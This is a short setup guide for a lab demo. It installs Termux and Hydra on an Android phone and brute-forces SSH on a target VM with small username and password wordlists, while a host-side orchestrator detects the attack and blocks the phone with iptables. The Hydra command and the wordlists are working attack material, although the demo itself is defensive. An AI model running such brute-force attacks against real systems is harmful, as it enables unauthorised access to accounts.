# Phone attacker (Termux) setup

Termux is a Linux userland on Android. We use it to run Hydra against the
target VM during the demo.

## Install

Install Termux from **F-Droid** (NOT the Play Store -- the Play Store version
is frozen and won't have Hydra in its repos):

https://f-droid.org/en/packages/com.termux/

## One-time setup

In Termux:

```bash
pkg update -y
pkg install -y hydra openssh nano
```

That's it.

## Run the attack

```bash
# Make wordlists once
cat > users.txt <<EOF
root
admin
ubuntu
guest
siem
test
oracle
EOF

cat > pass.txt <<EOF
password
123456
admin
letmein
ubuntu
qwerty
test
pass
toor
12345678
EOF

# Replace <target-ip> with the Ubuntu Server VM's bridged IP
hydra -L users.txt -P pass.txt -t 4 <target-ip> ssh
```

Within ~15 seconds the orchestrator on the Ubuntu host detects the spike,
runs `iptables -A INPUT -s <your-phone-ip> -j DROP` on the target VM via SSH,
kills any open sshd sessions, and Hydra dies with connection errors.

## Network setup reminder

Phone, Ubuntu host, and target VM must be on the same network.

Recommended: turn on phone hotspot, connect the Ubuntu laptop to it. The
target VM (in VirtualBox bridged mode) will get an IP from the phone's
hotspot too.

Find the target VM's IP by logging into it once and running `ip -4 addr show`.
